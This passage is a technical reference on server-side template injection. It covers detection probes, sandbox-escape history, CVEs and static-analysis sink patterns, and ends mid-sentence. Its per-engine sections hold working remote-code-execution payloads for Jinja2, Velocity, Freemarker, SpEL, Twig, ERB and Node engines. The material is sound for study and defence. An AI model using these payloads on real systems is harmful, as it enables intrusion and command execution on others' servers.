# Template Injection and Code-via-Template — Primitives and Defenses
## Synthesized from James Kettle, Maximilian Hildebrand (Hackmanit), Gareth Heyes, Olivier Beg / EdOverflow, Liran Tal (Snyk), the OWASP Web Security Testing Guide working group, Andrey Polkovnychenko (JFrog), and Kurt Boberg

> **Corpus note:** Several names commonly attached to SSTI in informal corpora (e.g. Sam
> Thomas — whose Snyk-credited research is in PHP deserialization, not template engines;
> Daniel Bohannon — whose obfuscation work covers PowerShell / `cmd.exe`) could not be
> verified to primary-source SSTI publications. The bio block is restricted to researchers
> with verifiable primary-source attribution. Hackmanit GmbH entered liquidation 2026-02-28;
> their research artifacts remain available on GitHub and the cheatsheet subdomain.

> **Researchers:**
> - **James Kettle** (@albinowax, Director of Research at PortSwigger) — Author of
>   "Server-Side Template Injection: RCE for the Modern Web App" (Black Hat USA 2015 + the
>   companion white paper). The five-stage **Detect / Identify / Read / Explore / Exploit**
>   methodology is the canonical reference, and Kettle's coining of "Server-Side Template
>   Injection" is the moment the bug class became a named taxonomised vulnerability rather
>   than a per-engine curiosity.
> - **Maximilian Hildebrand** (@m10x) / **Hackmanit GmbH** (in liquidation as of
>   2026-02-28) — Author of the 2023 master's thesis "Improving the Detection and
>   Identification of Template Engines for Large-Scale Template Injection Scanning."
>   Produced three load-bearing artifacts: the 44-engine Template Injection Table at
>   `cheatsheet.hackmanit.de/template-injection-table`, the Template Injection Playground,
>   and TInjA (CLI detection tool). The single largest empirical study of template-engine
>   differentiation by response delta.
> - **Gareth Heyes** (@garethheyes, PortSwigger Research) — Long-standing PortSwigger
>   research contributor; follow-on SSTI primers and detection techniques after Kettle's
>   2015 work. Notable for the "expression-language injection" generalisation that links
>   SSTI to AngularJS sandbox-bypass and JS prototype pollution detection. Active on the
>   PortSwigger Research blog and Web Security Academy SSTI labs.
> - **Olivier Beg / EdOverflow** (@EdOverflow) — Web developer and bug-bounty researcher;
>   maintains `bugbounty-cheatsheet` whose `cheatsheets/template-injection.md` is one of
>   the most cited working references for bounty hunters across HackerOne / Bugcrowd /
>   Intigriti. Captures pragmatic field knowledge from production triage.
> - **Liran Tal** (Director of Developer Relations, Snyk) — Author of Snyk's
>   "Understanding Server-Side Template Injection in Golang." Translates SSTI from research
>   into developer-facing engineering guidance.
> - **OWASP WSTG working group** — Curators of WSTG §4.7.18 "Testing for Server-side
>   Template Injection." Canonical reference for pentesters operationalising Kettle's
>   methodology; complemented by the OWASP Code Review Guide v2 and Cheat Sheet Series.
> - **Andrey Polkovnychenko** / **JFrog Security Research** — Multi-CVE Java ecosystem
>   research lead. Co-discoverer (with Shachar Menashe) of CVE-2021-42392 (H2 console JNDI,
>   "Log4Shell-like"); broader JFrog SRT output on Velocity / Freemarker / SpEL injection
>   in long-tail Java server software. The "expression languages are everywhere"
>   demonstration.
> - **Kurt Boberg** (`kurt-r2c` on GHSA; Staff Security Researcher at Semgrep) — Three
>   publicly-credited CVEs in the template-and-method-call injection cluster:
>   - **CVE-2022-24897** (XWiki Velocity, GHSA-cvx5-m8vg-vxgc): Velocity scripts not
>     sandboxed against the Java `File` API → arbitrary filesystem read/write. Patched in
>     xwiki-commons 12.6.7 / 12.10.3 / 13.0RC1. CVSS 7.5.
>   - **CVE-2022-33140** (Apache NiFi Registry, GHSA-77hf-23pq-2g7c): `ShellUserGroupProvider`
>     consumed user arguments to a templated shell command without neutralisation —
>     templating as OS-injection delivery. Patched in NiFi 1.16.3. CVSS 8.8.
>   - **CVE-2019-16676** (`simple_form`, GHSA-r74q-gxcg-73hx): `file_method?` dispatched
>     method calls via `@object.send(user_attribute_name)` — `send`-based dispatch as a
>     template-engine analogue. Patched in simple_form 5.0. CVSS 9.8.
>
> Sources: jameskettle.com; PortSwigger Research blog; Black Hat USA 2015 white paper PDF;
> hackmanit.de blog + cheatsheet.hackmanit.de; GitHub Hackmanit/TInjA, Hackmanit/template-
> injection-table, Hackmanit/template-injection-playground; github.com/EdOverflow/bugbounty-
> cheatsheet; snyk.io/blog and snyk.io/articles; OWASP Web Security Testing Guide v4.2;
> research.jfrog.com and jfrog.com/blog; nvd.nist.gov; github.com/advisories; jinja.palletsprojects.com;
> twig.symfony.com; freemarker.apache.org; velocity.apache.org; thymeleaf.org.

---

## 1. The Primitive — Why Templates Are Dangerous

### Templates are programs disguised as data

Every template engine is, at minimum, a small domain-specific language. Variable interpolation
(`{{ x }}`) is the visible surface; under it sit conditionals, loops, arithmetic, attribute and
index access, helper invocation, and — in Turing-complete engines like Jinja2, Freemarker,
Velocity, and Thymeleaf-with-SpEL — full method dispatch over the host language's runtime.

The naive mental model treats a template as a string with holes. The accurate model treats a
template as **a program in a sandboxed dialect of the host language**, where the host language
is exposed to whatever degree the sandbox concedes. The sandbox is always smaller than the
host. The history of SSTI is the history of attackers finding callable surfaces that the
sandbox author did not anticipate.

This is why "just escape variable interpolation" is insufficient as a defence: escaping
addresses cross-site scripting, where untrusted data flows *into* a static template body. SSTI
arises when untrusted data flows *as* the template body, or when the template body
interpolates structured data the engine then evaluates.

### The two-input model

Every template-rendered output is the product of two inputs:

1. The **template body** — developer-controlled in well-architected systems. Carries the
   programmatic structure: directives, loops, expressions, helper invocations.
2. The **variable context** — frequently user-controlled. The map of names to values the
   template renders against.

The clean architectural invariant is: **the template body is code; the variable context is
data**. When user input crosses from the data side to the code side — either because the
application accepts a template-string parameter from a user, or because the application
constructs the template body via string concatenation on user input — the architectural
invariant is violated and the bug class manifests.

### Worked example: the f-string template flip

```python
@app.route("/welcome")
def welcome():
    name = request.args.get("name", "guest")
    return render_template_string(f"<h1>Welcome {name}</h1>")
```

This line conflates the two inputs. The intended model: template body
`<h1>Welcome {{ name }}</h1>` rendered against context `{name: ...}`. The actual model:
template body **constructed from user input via Python f-string evaluation**, then passed
to the Jinja2 engine as if it were trusted code. The exploit:
`?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}` — the f-string
interpolates the attacker's payload into the template-body argument *before* Jinja2 sees
it.

Using a formatting function to construct a template-engine argument from user input is the
single most common SSTI sink in Python web applications. Equivalents: concatenating user
input into a Thymeleaf view name (Java/Spring); `ERB.new(user_input)` (Ruby);
`Twig\Loader\ArrayLoader` with a user-controlled key (PHP). Same architectural error, different
idioms.

### Server-side vs client-side templating

Server-side engines execute in the server's runtime, reaching command execution against
server resources. Client-side templating (AngularJS pre-1.6, Vue v-html, React's
`dangerouslySetInnerHTML` with template strings, browser Handlebars helpers) reaches
DOM-side primitives and overlaps stored XSS and prototype pollution (see
`prototype_pollution_expertise.md`). This document focuses on the **server-side** class;
client-side variants share the underlying flaw — a parser interpreting data as code.

### Expression-language injection is the broader umbrella

Templates are one species; **expression-language injection** is the genus. Other species:
SpEL, OGNL, MVEL, JEXL, GraphQL field-level expressions, and policy-DSL evaluators (CEL,
Rego, Sentinel, Cedar). The shared structural property: **a string field is parsed at
runtime into an AST that is then executed**. Section 4 covers the Java-ecosystem cluster
in detail. Any string field flowing to an expression evaluator is a code-injection sink
with the severity weighting of `eval()` or `Function()`. Overlaps the deserialization
class (`deserialization_expertise.md`); both are "executing attacker-controlled
instructions during data ingestion," distinguished by gadgets (deserialization) vs direct
AST construction (template / expression).

---

## 2. Per-Engine Attack Surface

This section catalogues the major engines as a working reference. For each, we list: the
**detection probe** (a payload that confirms the engine is rendering by producing a
distinctive output), the **evaluation primitive** the engine exposes, a **canonical
exploitation payload**, and notable **CVE corpus**. Treat the detection probes as a working
fingerprint set; the polyglot `${{<%[%'"}}%\.` (PortSwigger) renders or errors
distinctively across most engines and is a fast first probe.

### 2.1 Jinja2 (Python) and Django templates

**Detection:** `{{7*7}}` → `49` confirms Jinja2 or similar. `{{ 7*'7' }}` differentiates:
Jinja2 returns `7777777` (string-multiply), Django returns literal.

**Primitive:** Python attribute traversal. Every Python object has `.__class__`,
`.__mro__`, `.__subclasses__()`, `.__init__.__globals__`. The MRO walk is the canonical
escape: traverse to `object`, enumerate subclasses, find one importing a useful module,
invoke it.

```jinja2
{# os.popen via cycler #}
{{ cycler.__init__.__globals__.os.popen('id').read() }}

{# subprocess.Popen via __subclasses__ MRO walk #}
{{ ''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd', shell=True,
   stdout=-1).communicate()[0].strip() }}

{# Dynamic subclass discovery (no hardcoded offsets) #}
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if 'warning' in x.__name__ %}
    {{ x()._module.__builtins__['__import__']('os').popen('id').read() }}
  {% endif %}
{% endfor %}

{# Shortest known #}
{{ lipsum.__globals__["os"].popen('id').read() }}

{# Config-based (Flask) #}
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```

**Sandbox escape:** `SandboxedEnvironment` blocks `__class__` / `__mro__` /
`__subclasses__`. The recurring escape uses Python's `str.format` / `str.format_map`:
the format string `{0.__class__...}` reaches attributes via dispatch inside `str.format`'s
implementation, bypassing the sandbox's instrumented getter. CVE chain: CVE-2016-10745
(`str.format`), CVE-2019-10906 (`str.format_map`), CVE-2025-27516 (`attr` filter →
`format`). Each is a one-line denylist expansion; **sandboxing a Turing-complete language
by attribute denylist remains architecturally unsolved**.

**CVE corpus:** CVE-2016-10745, CVE-2019-10906, CVE-2024-22195 / 34064 (`xmlattr` filter),
CVE-2025-27516 (`attr` → `format`).

### 2.2 Apache Velocity (Java)

**Detection:** `#set($x=7*7)$x` → `49`. **Primitive:** `$class` reaches arbitrary
`java.lang.Class` instances via `forName`. Velocity directives (`#set`, `#foreach`, `#if`,
`#parse`, `#evaluate`) provide control flow.

```velocity
#set($runtime = $class.inspect("java.lang.Runtime").type.getRuntime())
$runtime.exec("id").waitFor()

$class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id")
```

**Kurt Boberg anchor — CVE-2022-24897 (XWiki Velocity, GHSA-cvx5-m8vg-vxgc):** XWiki
exposes Velocity as a scripting language for "Script rights" users with the expectation
that Velocity is sandboxed against dangerous Java APIs. The CVE demonstrated the Velocity
context still permitted Java `File` API operations — any XWiki API method returning a
`java.io.File` was a Velocity-driven read/write primitive. Patched in xwiki-commons
12.6.7 / 12.10.3 / 13.0RC1. CVSS 7.5.

The structural lesson: **a sandbox filtering "obvious" classes (`Runtime`, `ProcessBuilder`)
but not `File`, `FileWriter`, `Files`, `Paths`, `URL`, `URLConnection`, etc. is a denylist
with gaps**. The CVE corpus across Velocity-based products (XWiki, Liferay, Apache JSPWiki)
reads as a series of "another class slipped through" findings, each individually patched.

**CVE corpus:** CVE-2022-24897 (XWiki File API). **Defensive note:** Velocity's `SecureUberspector`
denies reflection methods; audit which `Uberspector` is configured (`Uberspect` without
`Secure` permits everything).

### 2.3 Apache Freemarker (Java)

**Detection:** `${7*7}` → `49` is a candidate signal; `<#assign x=7*7>${x}` is unambiguous.

**Primitive:** `<#assign ex="freemarker.template.utility.Execute"?new()>` — `?new()`
resolves a class name to an instance, and `Execute` is a built-in `TemplateMethodModel`
that runs `Runtime.exec`. This is Freemarker's intended power-user escape hatch; the
official docs explicitly warn against user-supplied templates.

```freemarker
${"freemarker.template.utility.Execute"?new()("id")}
[="freemarker.template.utility.Execute"?new()("id")]
```

**Sandbox:** `TemplateClassResolver.SAFER_RESOLVER` denies `Execute` and a documented
dangerous set; `ALLOWS_NOTHING_RESOLVER` denies `?new()` entirely.

**CVE corpus:** Liferay LPE-17023 (CVE-2020-13445).

### 2.4 Thymeleaf (Java/Spring)

**Detection:** Delimiters: `${...}` (SpEL when Spring-integrated), `*{...}`, `#{...}`,
`@{...}`, `~{...}`. `[[ ${expr} ]]` is inline.

**Primitive:** When Spring-integrated, `${...}` is **SpEL**. `T(...)` type references reach
any classpath class:

```thymeleaf
<p th:text="${T(java.lang.Runtime).getRuntime().exec('id')}">placeholder</p>
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

The `__${...}__::.x` form is the preprocessing escape:
Thymeleaf preprocesses `__...__` expressions **before** template rendering, so user input
reaching a *view name* evaluates as SpEL before any template body loads.

**Defence:** Thymeleaf 3.0.12+ adds expression-restricted view-name preprocessing. Deeper
fix: typed `ModelAndView` with static view-name literals, never string-built from user
input. View names are functionally a path-traversal class with code-execution reach
(see `code_review_expertise.md` §"absolute path handling").

**CVE corpus:** CVE-2023-38286, CVE-2026-40478.

### 2.5 Twig (PHP)

**Detection:** `{{7*7}}` → `49` (shared with Jinja2); `{{ _self }}` distinguishes via
Twig-specific type string.

**Primitive (≤1.19):** `_self.env` chain:

```twig
{{ _self.env.registerUndefinedFilterCallback("shell_exec") }}{{ _self.env.getFilter("id") }}
```

**Primitive (≥2.10 / 3.0; `sort` arrow ≥2.12):** Modern bypass uses the `map`/`filter`/`reduce`/`sort`
callback parameters, which still accept callable strings:

```twig
{{ ["id", 0]|sort("system") }}
{% set a = ["error_reporting","1"]|sort("ini_set") %}  # CVE-2022-23614 bypass
```

**Sandbox:** `SecurityPolicy` is the central control (allowlist tags, filters, functions,
methods, properties). Persistent failure: developers permit `sort`/`map`/`reduce` without
realising their second argument accepts arbitrary callables.

**CVE corpus:** CVE-2022-23614, CVE-2024-45411, multiple Drupal-Twig "Render API" CVEs.

### 2.6 ERB (Ruby)

**Detection:** `<%= 7*7 %>` renders `49`. **Primitive:** ERB is the closest to "no sandbox"
of the major engines — within `<%= %>` / `<% %>` blocks the full Ruby language is
available. The Ruby `$SAFE` levels were removed in 3.0.

```erb
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= Object.const_get('Kernel').send(:eval, 'system("id")') %>
```

**Kurt Boberg anchor — CVE-2019-16676 (`simple_form`, GHSA-r74q-gxcg-73hx):** Although
`simple_form` is not a template engine in the narrow sense, the bug demonstrates the deeper
pattern. `file_method?` dispatched method calls based on user-supplied attribute names:
`@object.send(attribute_name)`. The exclusion list (`password`, `time_zone`, `country`,
`email`, `phone`, `url`) was a denylist around the dispatch. **A `send`-based dispatcher
controlled by user input is functionally an evaluator over the object's method set** —
unbounded given Ruby's open-class metaprogramming. Attackers could call `#destroy`,
enumerate methods to fingerprint internal types, exhaust resources by calling
computation-heavy methods, or leak user information. Patched in simple_form 5.0 by
replacing `send`-based dispatch with `respond_to?` checks for naming-convention methods
(`_attachment`, `_url`, `_attacher`, `_file_name`).
CVSS 9.8.

The structural lesson generalises: **any dynamic-dispatch primitive (`send`, `__send__`,
`method`, `eval`, `instance_eval`, `Object.const_get(x).new`) is a template-engine
analogue and should be audited as one**. The correct pattern is `respond_to?` + direct
method call: an inspectable code path where the method name is statically visible.

### 2.7 Liquid (Shopify / Ruby)

**Designed safe:** `Drop` model is explicit allowlist; no introspection primitives. **In
practice:** custom `Liquid::Tag` and `Liquid::Filter` subclasses in host applications
expose host-language primitives. The well-known "Liquid SSTI" pattern lives in
application-defined filter/tag implementations evaluating user-supplied strings, and in
`Liquid::Drop` wrappers exposing `send` on underlying ActiveRecord models.

### 2.8 Mustache / Handlebars (JavaScript)

**Detection:** Mustache renders `{{7*7}}` literally (logic-less; no arithmetic). Both
engines look similar; `{{#with this as |o|}}{{o}}{{/with}}` differentiates Handlebars.

**Primitives:** Handlebars helpers are JS functions. Injection points:
- `Handlebars.registerPartial(name, source)` with user `source` is a stored sink.
- `{{helper userInput}}` where the helper passes argument to `eval` / `new Function` /
  `vm.runInThisContext`.
- Mustache `lambda` sections evaluating their argument as JS in the host application.

**Sandbox:** Handlebars compilation uses `new Function(...)` under the hood; user-controlled
template source produces an attacker-controlled JS function. Defence: precompile at build
time; never compile user sources. **CVE corpus:** CVE-2019-19919 (`prototype.constructor`
— overlaps `prototype_pollution_expertise.md`), CVE-2021-23369 (RCE via certain compile options on untrusted templates),
CVE-2021-23383 (prototype pollution via certain compile options).

### 2.9 Smarty (PHP)

**Detection:** `{$smarty.version}` returns version; `{7*7}` → `49`.

```smarty
{php}system('id');{/php}                          # legacy
{Smarty_Internal_Write_File::writeFile(...)}      # modern
{$smarty.template_object->smarty->display('string:{system("id")}')}
```

**Sandbox:** `Smarty_Security` + `$enable_security_settings` (operators must explicitly
enable). **CVE corpus:** CVE-2017-1000480, CVE-2018-13982, CVE-2021-26120, CVE-2024-35226
(`{extends}` file-name code injection).

### 2.10 Razor (.NET)

**Detection:** `@(7*7)` → `49`. **Primitive:** Razor compiles to C#. Any runtime compile of
user-controlled source (`RazorEngine.Razor.Parse(userInput, model)`) produces an
attacker-controlled C# class:

```cshtml
@{ System.Diagnostics.Process.Start("cmd", "/c whoami"); }
```

**Sandbox:** No effective sandbox for runtime-compiled Razor.

### 2.11 Pug, EJS (Node.js)

**Pug** `#{7*7}` → `49`; expressions are JS:

```pug
#{root.process.mainModule.require('child_process').execSync('id').toString()}
```

**EJS** `<%= 7*7 %>` → `49`:

```ejs
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
```

Pug `pug.compile(source)` with user source is a compile-time sink. EJS
`options.outputFunctionName` is raw JS — direct RCE without template syntax (CVE-2024-33883,
CVE-2022-29078).

### 2.12 Apache NiFi Expression Language

NiFi EL is intentionally limited (string ops, math, regex, attribute references) and by
design **does not apply to flowfile content** — only attributes and processor properties.

**Adjacent injection class:** processor properties that invoke shell/scripting and accept
EL-templated arguments.

**Kurt Boberg anchor — CVE-2022-33140 (Apache NiFi Registry, GHSA-77hf-23pq-2g7c):**
`ShellUserGroupProvider` (optional, not default) implemented group resolution via a
templated shell command; user-controlled group names concatenated into the command without
neutralisation yielded OS command injection on Linux/macOS. Patched in NiFi 1.16.3 by
removing the user-argument-accepting shell commands entirely. CVSS 8.8.

The architectural lesson: **a template engine whose substitution targets are passed to
`exec()` is an OS command injection sink**, not merely a templating one. NiFi's case is
the *delivery* mechanism for OS injection, not the evaluation mechanism. Cross-link
`shell_injection_expertise.md`. **CVE corpus:** CVE-2022-33140, CVE-2023-34468 (H2 JDBC
URL in DBCPConnectionPool → code execution).

### 2.13 Other notable engines (concise reference)

- **Mako (Python):** `${7*7}`. Full Python in `<% %>`. No sandbox.
- **Jinjava (Hubspot):** Java port of Jinja2.
- **Apache JSP / JSP-EL:** `${expr}` evaluated by JSP container.
- **Go `html/template` / `text/template`:** Only registered functions callable, but
  user-controlled template *source* (not just data) is the sink —
  `template.New("x").Parse(userInput)` is unsafe. Auto-contextual escaping defends XSS,
  not SSTI when the source itself is user-controlled.
- **Tornado templates:** `{% raw %}` blocks evaluate Python.
- **Mojolicious (Perl):** Full Perl in `<% %>`.

---

## 3. Detection as a Discipline

The Kettle methodology distinguishes **Detect** (does the engine evaluate input at all?)
from **Identify** (which engine is evaluating?). Conflating them slows triage.

### 3.1 The five-stage methodology

1. **Detect** — input reaches an evaluator. Probes: arithmetic (`{{7*7}}`, `${7*7}`,
   `#{7*7}`, `<%= 7*7 %>`), polyglot (`${{<%[%'"}}%\.`), error-induce (`{{ 1/0 }}`).
   Criterion: output differs from input in a way consistent with computation.
2. **Identify** — engine via differential responses. Hackmanit's 44-engine table is the
   working reference. Examples: `{{7*'7'}}` renders `7777777` in Jinja2 (string-mul),
   `49` in Twig (numeric coercion), error in Smarty. `${7*7}` renders `49` in Freemarker
   / Smarty / Spring, errors in Velocity. `{{ self }}` dumps Twig context, errors in Jinja2.
3. **Read** — study the engine's security/sandboxing documentation and CVE history.
4. **Explore** — map reachable objects. Jinja2: `__subclasses__()`. Velocity:
   `$class.inspect(...)`. Twig: `dump(_context)`.
5. **Exploit** — compose primitives into RCE / file read/write / SSRF.

### 3.2 Polyglot detection

The PortSwigger polyglot `${{<%[%'"}}%\.` is engineered so at least one delimiter
is recognised by every common engine:

- Jinja2 / Twig see `{{`
- Freemarker / Smarty / SpEL see `${`
- ERB / EJS / JSP see `<%`
- Velocity sees `#`/`$` partial render

Single-request differentiation across engine families narrows the candidate set to 1-2
engines for follow-up.

### 3.3 Blind detection

When output is not reflected, time-based (`time.sleep(5)` via Jinja2 MRO walk),
out-of-band (DNS exfil via `dig` / HTTP callback via `urllib.urlopen` inside MRO walk),
and Heyes-style harmless probes (side-effect-free operations producing observable
response deltas without crashing) are the working approach.

### 3.4 The "render vs error" indicator

- **Input echoed unchanged**: no evaluation; negative.
- **Input evaluated (`{{7*7}}` → `49`)**: SSTI confirmed; identify next.
- **500 with template-engine class names in stack trace**: SSTI confirmed; stack trace
  identifies engine.
- **500 without identifiable framing**: indeterminate; further probes.
- **Echoed with HTML-entities applied**: XSS-side escaping engaged; template side may
  still evaluate. Differentiate with arithmetic vs `<script>`.

---

## 4. Java's Specific Reach — SpEL, OGNL, MVEL, JEXL

Java's mature ecosystem ships several expression languages used throughout enterprise
software. Each is functionally an embedded interpreter for a subset of Java's type system,
with attacker-controlled-string-to-AST conversion as the canonical injection sink.

### 4.1 Spring Expression Language (SpEL)

Spring's `SpelExpressionParser.parseExpression(s).getValue(context)` is the canonical sink.
SpEL supports property/method access, type references via `T(fully.qualified.ClassName)`,
object instantiation via `new ...`, list/map/projection/selection operators, and bean
references (`@beanName`).

```java
T(java.lang.Runtime).getRuntime().exec("id")
new java.lang.ProcessBuilder({"sh", "-c", "id"}).start()
T(java.lang.Class).forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id")
```

**Production surfaces:** `@PreAuthorize("hasRole('USER') and #userInput == ...")` when
`#userInput` is a SpEL expression rather than comparand; Spring Cloud Function
routing expressions (CVE-2022-22963); Thymeleaf view names (§2.4); `@Value("#{...}")` constructed via format strings
including user input; Spring Data JPA `@Query` `?#{...}`; Spring Cloud Gateway routes
(CVE-2022-22947).

**Defence:** `SimpleEvaluationContext` (Spring 4.3.15+) disables type references and
constructor calls. `StandardEvaluationContext` (default) provides the full reflective
surface — its use with user-controlled expressions is equivalent to `Runtime.exec(userInput)`.

### 4.2 OGNL — Object Graph Navigation Language

OGNL is Apache Struts2's expression engine and surfaces in several other Apache projects.
The notorious CVE-2017-5638 (Struts2 Content-Type header) is OGNL injection masquerading as
HTTP-header processing: the `Content-Type` value, when invalid, was used to construct a
localised error message via `LocalizedTextUtil.findText`, which interprets `${...}` as
OGNL. Attacker-controlled Content-Type containing `${...}` reached OGNL evaluation.

The canonical exploit is a multi-stage OGNL payload that (1) overwrites
`#_memberAccess` with `DEFAULT_MEMBER_ACCESS`, (2) clears `excludedClasses` and
`excludedPackageNames` on the container's `OgnlUtil`, then (3) invokes
`new ProcessBuilder(...).start()`. The payload's complexity reflects the layered defences
Struts2 added over successive CVEs; the chain disables each before invoking
`ProcessBuilder`. Each new CVE in the corpus (CVE-2018-11776, CVE-2020-17530) adds another bypass layer or finds another evaluation entry point.

**Equifax (2017) note:** This is the CVE chain that led to the Equifax breach. Disclosed
2017-03-06; the breach window was approximately
mid-May through July 2017. The cautionary content here is operational, not technical: the
*technical* fix was a Struts2 upgrade, but the *breach* required a patching
gap. Cross-link `code_review_expertise.md` §"click-count severity" — Struts2 OGNL
injection was a zero-click, network-reachable, no-authentication RCE; the highest severity
class.

**Defence:** Move off Struts2 to a framework whose request-parameter dispatch does not
involve runtime expression evaluation. Within Struts2, `struts.ognl.allowStaticMethodAccess
= false` is necessary but not sufficient (the canonical exploit disables it).

### 4.3 MVEL — MVFLEX Expression Language

MVEL is widely embedded in policy engines: Drools (rule conditions), Activiti / jBPM
(BPMN gateway expressions), Apache Camel (`mvel:` URI scheme expressions), Mule ESB
(transformer scripts). MVEL is more powerful than SpEL in some respects (supports
inline-defined functions, full statement execution including loops and assignments) and
correspondingly more dangerous when evaluated against user input.

**Canonical RCE:**

```mvel
java.lang.Runtime.getRuntime().exec("id")
import java.lang.Runtime; Runtime.getRuntime().exec("id");
new ProcessBuilder("sh", "-c", "id").start()
```

### 4.4 JEXL — Apache Commons Jexl

JEXL is Apache Commons' expression engine, surfaces in: Apache Velocity tools, JEXL-based
policy DSLs (custom IAM engines), several feature-flag products. JEXL 2.1 added a sandboxing
feature (`JexlSandbox` in JEXL3).

**Canonical RCE:**

```jexl
''.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
```

**Defence:** JexlSandbox + a configured `JexlEngine.Builder.sandbox(...)`. The same
allowlist-vs-denylist analysis applies: only an allowlist of permitted classes and methods
is structurally sound.

### 4.5 The shared pattern across Java EL engines

All four engines share the architectural shape: a string parsed to an AST by a `Parser`,
walked by an `Evaluator` against an `EvaluationContext` that supplies type-resolution and
member-access policy. Default contexts permit full reflective reach. Auditor checklist:
search for `new SpelExpressionParser()`, `OgnlContext` instantiation, `MVEL.eval` /
`MVEL.compileExpression`, `JexlBuilder().create()` without `.sandbox(...)`. Trace data
flow from request parameters to each parse call. Cross-link
`deserialization_expertise.md` §"gadget chain" — expression-language injection is "ROP
for the JVM's reflective surface."

---

## 5. Sandbox Escape Patterns — Why "Sandboxed Templating" Is Defence-in-Depth, Not Primary Defence

Most major template engines ship a "sandboxed" mode: Jinja2 `SandboxedEnvironment`, Twig
`SecurityPolicy`, Velocity `SecureUberspector`, Freemarker `TemplateClassResolver.SAFER_RESOLVER`,
Smarty `Smarty_Security`. The recurring failure mode is well-documented across the CVE corpus:
**any callable the sandbox author did not enumerate is a candidate escape**.

### 5.1 The sandbox-as-denylist anti-pattern

Most template sandboxes intercept attribute access and reject a list of "known dangerous"
attributes. The structural problem: in a language whose runtime exposes thousands of
classes, an exhaustive denylist is intractable. Empirically, every major template engine
has accumulated sandbox-escape CVEs over its lifetime, each adding one or more
attributes to the denylist:

- **Jinja2:** `__class__` (initial), `str.format` (CVE-2016-10745), `str.format_map`
  (CVE-2019-10906), `attr` → `format` (CVE-2025-27516).
- **Twig:** `_self`, `registerUndefinedFilterCallback` (CVE-2015-7809),
  `sort`/`map`/`reduce` callable-second-arg family (CVE-2022-23614 et seq.).
- **Velocity:** `$class` introspection, File API (CVE-2022-24897, Kurt's anchor), Liferay
  bypasses.

Conclusion: **denylist sandboxes cannot be relied on as primary defence.**

### 5.2 The allowlist sandbox

Correctly architected: only enumerated classes/methods/attributes accessible. Twig
`SecurityPolicy` (operator-supplied allowlists), Freemarker `ALLOWS_NOTHING_RESOLVER`,
Liquid `Drop` model. Allowlist maintenance is bounded; denylist maintenance is unbounded.

### 5.3 Process isolation as structural defence

When user-controlled rendering is unavoidable, isolate at the OS layer rather than the
engine layer: `seccomp-bpf` filters, `unshare --net`, read-only filesystem, CPU/memory
limits, no cloud workload identity. Shifts the boundary from "engine sandbox" (small,
leaky) to "OS kernel process isolation" (well-tested). Cross-link
`container_k8s_security.md` §"workload identity."

### 5.4 Historical escapes (reference)

- **Jinja2 `config.items` reach (Flask):** when `config` is in context (default Flask
  templates), `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` works
  regardless of sandbox state if older attribute-checking permitted the chain.
- **Twig `_self.env` reach:** pre-2.x exposed the template object whose `env` is
  `Twig\Environment`; `registerUndefinedFilterCallback("system")` + invoking an undefined
  filter dispatches arbitrary PHP.
- **Velocity File API (CVE-2022-24897, Kurt's anchor):** blocked `Runtime` reflection but
  not `java.io.File` / `FileWriter` / `Files`; any API returning a `File` became a
  filesystem read/write primitive.
- **SpEL `T(...)`:** `StandardEvaluationContext` permits arbitrary classpath reach via
  type references. Only fix: `SimpleEvaluationContext`.

### 5.5 Synthesised defence-in-depth posture

- **Primary:** never render user-controlled template sources.
- **Architectural:** process isolation when unavoidable.
- **Engine:** sandbox mode configured pessimistically (deny-default allowlist).
- **Monitoring:** log every sandbox-rejection event (rejections in production are either
  misconfiguration or active probing).
- **Patch cadence:** subscribe to the engine's security advisory feed; patch within
  72h of any sandbox-escape disclosure.

---

## 6. User-Controlled Template Indicators — Static Detection

This section describes detection patterns from a static-analysis (Semgrep, CodeQL,
Sourcegraph) perspective. Cross-link the [Semgrep rule-writing docs](https://semgrep.dev/docs/writing-rules/overview) for the rule-authoring
discipline; these are the candidate sinks that warrant rules.

### 6.1 Sink catalog by language

The pattern is identical across languages: any template-engine constructor or factory whose
template-source argument is *not a string literal* is a candidate sink. Refined to taint
mode, sources are `request.args.get`, `request.form.get`, request bodies, cookie values,
header values, database-stored user content, and (for stored-template variants) any
persistence-layer read.

```python
# Python
flask.render_template_string($X)                # any non-literal $X
jinja2.Template($X).render(...)
jinja2.Environment(...).from_string($X).render()
django.template.Template($X).render(context)
django.template.engines['django'].from_string($X).render(context)
mako.template.Template($X).render()
tornado.template.Template($X).generate()
```

```java
// Java
SpelExpressionParser().parseExpression($X).getValue(context);
new ModelAndView($X);                            // Thymeleaf view name
return $X;                                       // method-return as view name
Velocity.evaluate(context, writer, "tag", $X);
new Template("name", new StringReader($X), cfg); // Freemarker
MVEL.eval($X) / MVEL.compileExpression($X);
new JexlBuilder().create().createExpression($X); // no sandbox
Ognl.parseExpression($X);                        // Struts2
```

```php
// PHP
new \Twig\Environment(new \Twig\Loader\ArrayLoader(['n' => $X]));
$smarty->display('string:' . $X);
$smarty->fetch('eval:' . $X);
```

```ruby
# Ruby
ERB.new($X).result(binding)
Liquid::Template.parse($X).render(context)
@object.send($X)                                 # CVE-2019-16676 pattern
@object.public_send($X)
obj.method($X).call
```

```javascript
// JS / Node
Handlebars.compile($X);
Handlebars.registerPartial("name", $X);
pug.compile($X) / pug.render($X);
ejs.render($X) / ejs.compile($X);
new PromptTemplate({template: $X, ...});         // LangChain
```

### 6.2 Format-string as template-engine sink

A frequently-missed pattern: f-strings, `str.format`, `printf`-family, and string-template
literals **are themselves template engines**. When their format-string argument is
user-controlled, the result is an evaluation primitive.

```python
# Python str.format -- attribute access reach
"{0.__class__.__mro__[1].__subclasses__()}".format(some_obj)
# CVE-2016-10745 was Jinja2's wrapper around this; the underlying primitive is in CPython

# Python f-string -- evaluates expressions
eval(f"x = {user_input}")  # double sink

# Java String.format / MessageFormat -- argument injection
String.format(userControlledFormatString, args);

# .NET String.Format
String.Format(userControlledFormat, args);
```

Format strings are a SSTI-class sink even when no "template engine" is invoked. Cross-link
